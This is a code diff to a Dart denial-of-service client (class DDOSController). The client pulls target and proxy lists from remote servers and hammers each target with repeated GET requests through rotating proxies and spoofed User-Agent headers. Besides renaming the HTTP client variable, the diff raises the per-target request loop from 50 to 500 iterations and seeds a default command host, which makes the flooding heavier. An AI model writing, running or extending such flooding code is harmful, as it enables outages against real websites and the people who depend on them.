@@ -31,10 +31,10 @@ class Proxy {
 }
 
 class DDOSController {
-  List<String> hosts = [];
+  List<String> hosts = [defaultHost];
   List<String> directTargets = [];
-  Dio dio = Dio();
-  final int maxIterations = 50;
+  Dio _dio = Dio();
+  final int maxIterations = 500;
 
   /// Init hosts and direct targets
   Future<void> init(void Function(DDOSInfo) callback) async {
@@ -57,7 +57,7 @@ class DDOSController {
 
   Future<DDOSInfo> _getHosts() async {
     try {
-      Response response = await dio.getUri(Uri.parse(apiURL));
+      Response response = await _dio.getUri(Uri.parse(apiURL));
       String body = "";
 
       try {
@@ -102,7 +102,7 @@ class DDOSController {
 
   Future<DDOSInfo> _getDirectTargets() async {
     try {
-      Response response = await dio.getUri(Uri.parse(sourceURL));
+      Response response = await _dio.getUri(Uri.parse(sourceURL));
       String body = "";
 
       try {
@@ -144,7 +144,7 @@ class DDOSController {
     List<Proxy> proxies = [];
 
     try {
-      Response response = await dio.getUri(Uri.parse(proxySource));
+      Response response = await _dio.getUri(Uri.parse(proxySource));
       Map<String, dynamic> jsonData = {};
 
       try {
@@ -232,7 +232,7 @@ class DDOSController {
     for (String host in hosts) {
       try {
         // request target from host
-        Response response = await dio.getUri(
+        Response response = await _dio.getUri(
           Uri.parse(host),
           options: Options(
             headers: headers,
@@ -314,7 +314,6 @@ class DDOSController {
     List<Proxy> proxies = await _getProxies();
     // let's shuffle them
     proxies.shuffle();
-    directTargets.shuffle();
 
     for (String target in directTargets) {
       try {
@@ -348,10 +347,10 @@ class DDOSController {
     Map<String, String> headers,
     List<Proxy> proxies,
   ) async {
-    dio = Dio();
+    _dio = Dio();
     Response? response;
     try {
-      response = await dio
+      response = await _dio
           .getUri(
             target,
             options: Options(
@@ -374,7 +373,7 @@ class DDOSController {
           // update headers
           headers['User-Agent'] = faker.internet.userAgent();
           // apply proxy
-          (dio.httpClientAdapter as DefaultHttpClientAdapter)
+          (_dio.httpClientAdapter as DefaultHttpClientAdapter)
               .onHttpClientCreate = (client) {
             client.findProxy = (uri) {
               return proxy.toString();
@@ -382,8 +381,8 @@ class DDOSController {
             return HttpClient();
           };
 
-          dio.options.headers = headers;
-          var dioResponse = await dio
+          _dio.options.headers = headers;
+          var dioResponse = await _dio
               .getUri(
                 target,
               )
@@ -400,7 +399,7 @@ class DDOSController {
           if (dioResponse.statusCode! >= 200 &&
               dioResponse.statusCode! <= 302) {
             for (int i = 0; i < maxIterations; ++i) {
-              dioResponse = await dio
+              dioResponse = await _dio
                   .getUri(
                     target,
                   )
@@ -432,7 +431,7 @@ class DDOSController {
         for (int i = 0; i < maxIterations; ++i) {
           // update headers
           headers['User-Agent'] = faker.internet.userAgent();
-          response = await dio
+          response = await _dio
               .getUri(
                 target,
                 options: Options(
